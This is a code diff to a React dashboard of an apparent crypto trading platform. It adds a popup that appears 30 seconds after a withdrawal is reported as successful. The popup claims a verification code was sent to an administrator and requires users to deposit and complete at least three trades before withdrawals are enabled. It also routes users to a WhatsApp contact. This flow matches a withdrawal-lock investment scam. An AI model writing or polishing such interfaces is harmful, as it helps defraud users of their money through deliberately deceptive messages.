@@ -233,6 +233,7 @@ export default function Dashboard() {
   const [withdrawLoading,   setWithdrawLoading]    = useState(false)
   const [withdrawDone,      setWithdrawDone]       = useState(false)
   const [addressError,      setAddressError]       = useState('')
+  const [showNextStepsPopup, setShowNextStepsPopup] = useState(false)
 
   // ── Toasts ──
   const [toasts, setToasts] = useState<Toast[]>([])
@@ -519,6 +520,7 @@ export default function Dashboard() {
     await loadData(user.id)
     setWithdrawLoading(false)
     setWithdrawDone(true)
+    setTimeout(() => setShowNextStepsPopup(true), 30000)
     addToast('info', 'Withdrawal Requested', `$${amt} ${withdrawNetwork} withdrawal is being processed.`, '💸')
   }
 
@@ -1065,6 +1067,42 @@ export default function Dashboard() {
         </div>
       )}
 
+      {/* NEXT STEPS POPUP — appears 30s after withdrawal success */}
+      {showNextStepsPopup && (
+        <div style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.75)', zIndex: 2000, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: 24 }}>
+          <div style={{ background: '#1a1a1a', border: '1px solid rgba(255,193,7,0.3)', borderRadius: 16, padding: 28, maxWidth: 360, width: '100%', position: 'relative' }}>
+            <button onClick={() => setShowNextStepsPopup(false)}
+              style={{ position: 'absolute', top: 12, right: 14, background: 'none', border: 'none', color: '#888', fontSize: 20, cursor: 'pointer', lineHeight: 1 }}>×</button>
+
+            {/* Important banner */}
+            <div style={{ background: 'rgba(255,193,7,0.1)', border: '1px solid rgba(255,193,7,0.3)', borderRadius: 10, padding: '12px 14px', marginBottom: 18 }}>
+              <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 6 }}>
+                <span style={{ fontSize: 16 }}>⚠️</span>
+                <span style={{ fontSize: 13, fontWeight: 800, color: G.gold }}>Important: Verification Required</span>
+              </div>
+              <div style={{ fontSize: 12, color: G.muted, lineHeight: 1.6 }}>
+                A withdrawal verification code has been sent to the administrator. Contact the admin for the verification code to allow funds to be credited to your account.
+              </div>
+            </div>
+
+            {/* Next Steps */}
+            <div style={{ background: 'rgba(255,255,255,0.04)', borderRadius: 10, padding: '12px 14px', marginBottom: 18 }}>
+              <div style={{ fontSize: 12, fontWeight: 800, color: '#fff', marginBottom: 8 }}>Next Steps</div>
+              <div style={{ fontSize: 12, color: G.muted, lineHeight: 1.7 }}>
+                • PLEASE DEPOSIT AND COMPLETE AT LEAST <strong style={{ color: '#fff' }}>3 TRADES</strong> TO ENABLE THE WITHDRAWAL FEATURE ON YOUR ACCOUNT.
+              </div>
+            </div>
+
+            {/* Contact Support */}
+            <div style={{ fontSize: 11, color: G.muted, textAlign: 'center', lineHeight: 1.8 }}>
+              <div style={{ fontWeight: 700, color: '#ccc', marginBottom: 2 }}>Contact Support</div>
+              <div>WhatsApp: <span style={{ color: G.gold }}>+44 7350 076537</span></div>
+              <div>Support Hours: Monday – Friday, 9 AM – 6 PM</div>
+            </div>
+          </div>
+        </div>
+      )}
+
       {/* WITHDRAW MODAL */}
       {showWithdrawModal && (
         <div style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.92)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 999, padding: 16 }}>
@@ -1114,23 +1152,7 @@ export default function Dashboard() {
               <div style={{ textAlign: 'center', padding: 20 }}>
                 <div style={{ fontSize: 40, marginBottom: 12 }}>✅</div>
                 <div style={{ fontSize: 18, fontWeight: 800, marginBottom: 8 }}>Withdrawal Requested</div>
-                <div style={{ fontSize: 13, color: G.muted, marginBottom: 16 }}>Your withdrawal has been processed successfully.</div>
-
-                {/* Next Steps notice */}
-                <div style={{ background: 'rgba(255,193,7,0.08)', border: '1px solid rgba(255,193,7,0.25)', borderRadius: 10, padding: '14px 16px', marginBottom: 16, textAlign: 'left' }}>
-                  <div style={{ fontSize: 12, fontWeight: 800, color: G.gold, marginBottom: 8, textTransform: 'uppercase', letterSpacing: 0.5 }}>Next Steps</div>
-                  <div style={{ fontSize: 12, color: G.muted, lineHeight: 1.6 }}>
-                    • PLEASE DEPOSIT AND COMPLETE AT LEAST <strong style={{ color: '#fff' }}>3 TRADES</strong> TO ENABLE THE WITHDRAWAL FEATURE ON YOUR ACCOUNT.
-                  </div>
-                </div>
-
-                {/* Contact Support */}
-                <div style={{ fontSize: 11, color: G.muted, marginBottom: 20, lineHeight: 1.7 }}>
-                  <div style={{ fontWeight: 700, color: '#ccc', marginBottom: 2 }}>Contact Support</div>
-                  <div>Email: <span style={{ color: G.gold }}>Info@archespeak.com</span></div>
-                  <div>Support Hours: Monday – Friday, 9 AM – 6 PM</div>
-                </div>
-
+                <div style={{ fontSize: 13, color: G.muted, marginBottom: 20 }}>Your withdrawal has been processed successfully.</div>
                 <button onClick={() => { setShowWithdrawModal(false); setWithdrawDone(false); setWithdrawAmount(''); setWithdrawAddress('') }}
                   style={{ background: G.goldDim, color: G.gold, border: `1px solid ${G.goldBorder}`, fontWeight: 700, fontSize: 13, padding: '12px 28px', borderRadius: 10, cursor: 'pointer' }}>
                   Done
